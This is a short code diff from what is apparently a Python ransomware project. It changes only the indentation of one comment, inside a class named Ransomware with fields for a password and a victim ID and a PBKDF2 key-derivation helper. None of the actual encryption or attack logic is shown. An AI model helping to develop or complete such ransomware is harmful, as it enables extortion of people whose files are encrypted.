@@ -75,7 +75,7 @@ class Ransomware:
         self.password = None
         self.victim_id = None
         logger.info("Ransomware has been initialized.")
-        # --- Directory Setup and Validation End---
+    # --- Directory Setup and Validation End---
 
     # --- PBKDF2 Key Derivation Functions Start ---
     def _derive_key_from_password(self, password: str, salt: bytes) -> bytes:
